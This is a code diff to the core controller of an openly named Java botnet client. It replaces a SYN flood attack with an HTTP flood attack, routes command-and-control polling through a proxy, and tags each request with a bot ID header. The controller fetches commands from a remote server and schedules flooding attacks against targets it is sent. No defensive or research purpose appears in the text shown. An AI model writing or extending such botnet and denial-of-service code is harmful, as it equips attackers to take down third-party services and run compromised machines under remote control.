@@ -32,7 +32,7 @@ import com.acmutv.botnet.config.serial.AppConfigurationFormat;
 import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
-import com.acmutv.botnet.core.attack.SynFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
 import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.control.ControllerService;
 import com.acmutv.botnet.core.control.command.BotCommand;
@@ -48,6 +48,7 @@ import com.acmutv.botnet.log.AppLogMarkers;
 import com.acmutv.botnet.tool.io.IOManager;
 import com.acmutv.botnet.tool.net.HttpManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
+import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.time.Duration;
@@ -245,8 +246,10 @@ public class CoreController {
         if (HttpManager.isHttpUrl(initResource)) {
           HttpMethod method = HttpMethod.GET;
           URL url = new URL(initResource);
-          Map<String,String> props = controller.getAuthentication(new HashMap<>());
-          in = HttpManager.getResponseBodyAsInputStream(method, url, props);
+          HttpProxy proxy = controller.getProxy();
+          Map<String,String> header = controller.getAuthentication(new HashMap<>());
+          header.put("bid", ID);
+          in = HttpManager.getResponseBody(method, url, proxy, header, null);
         } else {
           in = IOManager.getInputStream(initResource);
         }
@@ -291,13 +294,13 @@ public class CoreController {
 
     switch (cmd.getScope()) {
 
-      case ATTACK_SYNFLOOD:
+      case ATTACK_HTTPFLOOD:
         if (!STATE.equals(BotState.EXECUTION)) {
           throw new BotExecutionException("Cannot execute command, because [STATE] is not [EXECUTION]");
         }
-        @SuppressWarnings("unchecked") final List<SynFloodAttack> httpAttacks = (List<SynFloodAttack>) cmd.getParams().get("attacks");
+        @SuppressWarnings("unchecked") final List<HttpFloodAttack> httpAttacks = (List<HttpFloodAttack>) cmd.getParams().get("attacks");
         if (httpAttacks == null) {
-          throw new BotMalformedCommandException("Cannot execute command ATTACK_SYNFLOOD: param [attacks] is null");
+          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTPFLOOD: param [attacks] is null");
         }
 
         final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
@@ -305,8 +308,8 @@ public class CoreController {
           delayCommand(attackHttpDelay.getRandomDuration(), CommandScope.KILL);
         }
 
-        for (SynFloodAttack attack : httpAttacks) {
-          attackHttp(attack);
+        for (HttpFloodAttack attack : httpAttacks) {
+          attackHttpFlooding(attack);
         }
 
         break;
@@ -420,15 +423,15 @@ public class CoreController {
   }
 
   /**
-   * Executes command {@code ATTACK_SYNFLOOD}.
-   * @param attack the HTTP attack details.
+   * Executes command {@code ATTACK_HTTPFLOOD}.
+   * @param attack the HTTP Flooding attack details.
    * @throws BotExecutionException when te attack cannot be scheduled.
    */
-  private static void attackHttp(SynFloodAttack attack) throws BotExecutionException {
+  private static void attackHttpFlooding(HttpFloodAttack attack) throws BotExecutionException {
     LOGGER.traceEntry("attack={}", attack);
-    LOGGER.info("Scheduling attack against {}...", attack.getTarget());
+    LOGGER.info("Scheduling HTTP Flooding attack against {}...", attack.getTarget());
     try {
-      POOL.scheduleAttackHttp(attack);
+      POOL.scheduleAttackHttpFlooding(attack);
     } catch (SchedulerException exc) {
       throw new BotExecutionException("Cannot schedule attack. %s", exc.getMessage());
     }
@@ -621,9 +624,11 @@ public class CoreController {
       if (HttpManager.isHttpUrl(cmdResource)) {
         HttpMethod method = HttpMethod.GET;
         URL url = new URL(cmdResource);
-        Map<String,String> props = CONTROLLER.getAuthentication(new HashMap<String,String>());
+        HttpProxy proxy = CONTROLLER.getProxy();
+        Map<String,String> header = CONTROLLER.getAuthentication();
+        header.put("bid", ID);
         try (InputStream in =
-                 HttpManager.getResponseBodyAsInputStream(method, url, props)) {
+                 HttpManager.getResponseBody(method, url, proxy, header, null)) {
           cmd = BotCommandService.fromJson(in);
         }
       } else {
